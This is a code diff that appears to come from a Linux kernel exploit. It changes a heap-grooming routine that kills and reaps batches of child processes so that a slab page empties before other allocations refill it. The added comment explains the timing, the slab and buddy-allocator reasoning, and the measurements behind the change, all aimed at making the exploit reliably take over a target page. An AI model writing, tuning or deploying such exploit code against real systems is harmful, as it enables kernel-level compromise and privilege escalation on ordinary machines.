@@ -558,10 +558,25 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
        * the way down the list -- including the target, which the next
        * iteration then reads as sc==0 -> owned. */
       if ((w + 1) % CONVERT_HOLD_WAVES == 0) {
+        /* Two-phase batch kill: SIGKILL every held pid first (fast, us
+         * apart), then reap.  mm_structs are freed at process EXIT, not
+         * at waitpid, so the whole slab batch goes empty within a few ms
+         * of the last SIGKILL -- before foreign forks can refill the
+         * slots.  kill_child's serial kill+waitpid takes ~0.7s for 660
+         * pids and forensics shows the page refilled to inuse=34 inside
+         * that window (pre-sweep inuse=0 -> post-wave inuse=34, sc never
+         * read 0 across 5 rounds), so the tsc read one iteration later
+         * always missed the buddy window.  With the fast phase the
+         * empty->refill window shrinks to the reap latency (~tens of ms)
+         * and the next iteration's tsc read lands inside it. */
+        for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++)
+          for (size_t i = 0; i < wave_sz; i++)
+            if (wave_pids[k * wave_sz + i])
+              kill(wave_pids[k * wave_sz + i], SIGKILL);
         for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++) {
           for (size_t i = 0; i < wave_sz; i++) {
             if (wave_pids[k * wave_sz + i]) {
-              kill_child(wave_pids[k * wave_sz + i]);
+              waitpid(wave_pids[k * wave_sz + i], NULL, 0);
               wave_pids[k * wave_sz + i] = 0;
             }
           }
